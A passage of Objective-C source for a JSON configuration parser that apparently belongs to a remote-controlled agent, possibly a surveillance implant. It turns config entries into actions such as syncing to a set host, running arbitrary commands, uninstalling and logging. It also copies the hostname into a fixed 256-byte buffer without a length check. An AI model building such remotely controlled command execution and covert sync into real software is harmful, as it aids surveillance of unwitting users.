  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  syncStruct_t tmpSyncStruct;
  
  NSNumber *type   = [NSNumber numberWithUnsignedInt: ACTION_SYNC];
  NSNumber *status = [NSNumber numberWithUnsignedInt: 0];
  NSData   *data;

  NSNumber *stop      = [subAction objectForKey: ACTION_SYNC_STOP_KEY];
  NSNumber *bandwidth = [subAction objectForKey: ACTION_SYNC_BAND_KEY];
  NSNumber *mindelay  = [subAction objectForKey: ACTION_SYNC_MIN_KEY];
  NSNumber *maxdelay  = [subAction objectForKey: ACTION_SYNC_MAX_KEY];
  NSString *host      = [subAction objectForKey: ACTION_SYNC_HOST_KEY];
  
  // incorrect sync action! XXX- todo verification
  if ( host == nil) 
    {
      return nil;
    }
  
  tmpSyncStruct.bandwidthLimit = (bandwidth == nil ? 1 : [bandwidth intValue]);
  tmpSyncStruct.minSleepTime  = (mindelay == nil ? 1 : [mindelay intValue]);
  tmpSyncStruct.maxSleepTime  = (maxdelay == nil ? 1 : [maxdelay intValue]);
  
  NSData *tmpHostnameData = [host dataUsingEncoding: NSUTF8StringEncoding];
  
  memset(tmpSyncStruct.configString, 0, 256);

  memcpy(tmpSyncStruct.configString, 
         [tmpHostnameData bytes], 
         [tmpHostnameData length]);
  
  data = [[NSData alloc] initWithBytes: &tmpSyncStruct length:sizeof(syncStruct_t)];
  
  NSMutableDictionary *subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                              type, @"type", status, @"status", data, @"data", stop, @"stop", nil];
  
  [data release];
  
  [pool release];
  
  return subActDict;
}

// Done.
- (NSMutableDictionary *)initActionEvent:(NSDictionary *)subAction
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSData   *data = nil;
  action_event_t actEvent;
  
  NSNumber *type = [NSNumber numberWithUnsignedInt: ACTION_EVENT];
  NSString *status = [subAction objectForKey: ACTION_EVENT_STATUS_KEY];
  NSNumber *event  = [subAction objectForKey: ACTION_EVENT_EVENT_KEY];
  
  if (status != nil && [status compare:ACTION_EVENT_STATUS_ENA_KEY] == NSOrderedSame)
    {
      actEvent.enabled = TRUE;  
    }
  else
    {
      actEvent.enabled = FALSE;
    }
    
  if (event != nil)
    actEvent.event = [event intValue];
  else
    actEvent.event = EVENT_UNKNOWN;
    
  data = [[NSData alloc] initWithBytes: &actEvent length:sizeof(actEvent)];
  
  NSMutableDictionary *subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                              type, @"type", status, @"status", data, @"data", nil];
  
  [data release];
  
  [pool release];
  
  return subActDict;
}

// Done.
- (NSMutableDictionary *)initActionCommand:(NSDictionary *)subAction
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSNumber *type = [NSNumber numberWithUnsignedInt: ACTION_EXECUTE];
  
  NSNumber *status = [NSNumber numberWithUnsignedInt: 0];
  NSString *command = [subAction objectForKey:ACTION_CMD_COMMAND_KEY];
  
  NSData *data      = [command dataUsingEncoding:NSUTF8StringEncoding];
  
  NSMutableDictionary *subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                                     type, @"type", status, @"status", data, @"data", nil];
  
  [pool release];
  
  return subActDict;
}

- (NSMutableArray *)initSubActions:(NSArray *)subactions
{
  NSMutableArray *iSubAct = [[NSMutableArray alloc] initWithCapacity: 0];
  NSMutableDictionary *subActDict = nil;
  
  if (subactions != nil) 
    {
    for (int i=0; i<[subactions count]; i++) 
      {
        NSDictionary *subAction = (NSDictionary *)[subactions objectAtIndex:i];
        NSString *typeString = (NSString *)[subAction objectForKey: ACTION_TYPE_KEY];
        
        if (typeString == nil)
          continue;
        
        subActDict = nil;
        
        // Internet sync
        if ([typeString compare: ACTION_SYNC_KEY] == NSOrderedSame) 
          {
           subActDict = [self initActionSync: subAction];
          }
        else if ([typeString compare: ACTION_MODULE_KEY] == NSOrderedSame) 
          {
           subActDict = [self initActionModule: subAction];
          }
        else if ([typeString compare: ACTION_LOG_KEY] == NSOrderedSame) 
          {
           subActDict = [self initActionInfolog: subAction];
          }
        else if ([typeString compare: ACTION_UNINST_KEY] == NSOrderedSame) 
          {
           subActDict = [self initActionUninstall: subAction];
          }
        else if ([typeString compare: ACTION_EVENT_KEY] == NSOrderedSame) 
          {
           subActDict = [self initActionEvent: subAction];
          }
        else if ([typeString compare: ACTION_CMD_KEY] == NSOrderedSame) 
          {
            subActDict = [self initActionCommand: subAction];
          }
          
        if (subActDict != nil)
          {
           [iSubAct addObject: subActDict];
           [subActDict release];
          }
      }
    }
  
  return iSubAct;
}


- (NSMutableDictionary *)initSubActions:(NSArray *)subactions 
                              forAction:(NSNumber *)actionNum
{
  // may return a 0 subactions array, but never nil
  NSMutableArray *parsedSubactions = [self initSubActions: subactions];
  
  NSMutableDictionary *newAction = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                             actionNum, ACTION_NUM_KEY, parsedSubactions, ACTION_SUBACT_KEY, nil];
                             
  [parsedSubactions release];
  
  return newAction;
}

- (void)parseAndAddActions:(NSDictionary *)dict
{  
  NSArray *actionsArray = [dict objectForKey: ACTIONS_KEY];
  
  if (actionsArray == nil) 
      return;
  
  for (int i=0; i < [actionsArray count]; i++) 
    {
      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc]init];
      
      NSDictionary *action = (NSDictionary *)[actionsArray objectAtIndex: i];

      NSArray  *subactions  = (NSArray *)[action objectForKey: ACTION_SUBACT_KEY];
      NSNumber *actionNum = [NSNumber numberWithUnsignedInt: i];
      
      NSMutableDictionary *newAction = [self initSubActions:subactions forAction:actionNum];
 
      [mActionsList addObject: newAction];
      
      [newAction release];
      
      [inner release];
    }
}

#
#
#pragma mark SBJsonStreamParserAdapterDelegate methods
#
#

- (void)parser:(SBJsonStreamParser *)parser foundObject:(NSDictionary *)dict 
{
#ifdef DEBUG_JSON_CONFIG
	NSLog(@"%s: found dictionary", __FUNCTION__);
#endif
  
  // running the parsers
  [self parseAndAddActions: dict];

#ifdef DEBUG_JSON_CONFIG
  NSLog(@"%s: found actions dict %@", __FUNCTION__, dict);
  NSLog(@"%s: actions array %@", __FUNCTION__, mActionsList);
#endif

  [self parseAndAddEvents: dict];
   
  [self parseAndAddModules: dict];
  
#ifdef DEBUG_JSON_CONFIG
  id tmpArray = [dict objectForKey: EVENTS_KEY];
  NSLog(@"%s: found events dict %@", __FUNCTION__, tmpArray);
  NSLog(@"%s: events array %@", __FUNCTION__, mEventsList);
#endif
}

#define FILE_CONFIG @"/tmp/config"

- (BOOL)runParser:(NSData*)dataConfig
{
  SBJsonStreamParserStatus status;
  
  if (dataConfig == nil) {
#ifdef DEBUG_JSON_CONFIG    
    NSLog(@"%s: no configuration file...", __FUNCTION__);
#endif
    return NO;
  }
  
  @try {
    status = [parser parse: dataConfig];
  }
  @catch (NSException *exception) {
#if DEBUG_JSON_CONFIG
    NSLog(@"%s: exception on parsing configuration", __FUNCTION__);
#endif
    status = SBJsonStreamParserError;
  }

  

#ifdef DEBUG_JSON_CONFIG  
  NSLog(@"%s: parser runned: %d", __FUNCTION__,  status);
#endif
  
	if (status == SBJsonStreamParserError) 
    {
#ifdef DEBUG_JSON_CONFIG    
      NSLog(@"%s: Parser error: %@", __FUNCTION__, parser.error);
#endif
      return NO;
    } 
  else if (status == SBJsonStreamParserWaitingForData) 
    {
#ifdef DEBUG_JSON_CONFIG
      NSLog(@"%s: Parser waiting for more data", __FUNCTION__);
#endif
      return NO;
    }
  else if (status == SBJsonStreamParserComplete) 
    {
#ifdef DEBUG_JSON_CONFIG    
      NSLog(@"%s: parsing correctly!", __FUNCTION__);
#endif
      return YES;
    }
  
  return YES;
}


- (BOOL)runParser:(NSData*)aConfiguration
       WithEvents:(NSMutableArray*)eventsArray
       andActions:(NSMutableArray*)actionsArray
       andModules:(NSMutableArray*)modulesArray
{
  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
  
  BOOL bRet = FALSE;
  
//  SBJSonConfigDelegate *myJSon = [[SBJSonConfigDelegate alloc] init];
//  
//  [myJSon runParser];
//  
//  [myJSon release];
  
  mEventsList = eventsArray;
  mActionsList = actionsArray;
  mAgentsList = modulesArray;
  
  bRet = [self runParser: aConfiguration];
  
  [pool release];
  
  return  bRet;
}


@end
